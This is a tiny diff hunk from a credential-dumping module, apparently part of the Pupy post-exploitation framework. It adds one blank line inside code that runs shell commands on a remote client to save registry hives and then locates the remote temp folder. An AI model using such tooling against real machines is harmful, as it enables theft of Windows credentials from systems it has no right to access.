@@ -179,6 +179,7 @@ class CredDump(PupyModule):
         for cmd in cmds:
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
+
         self.success("hives saved!")
         remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")
 
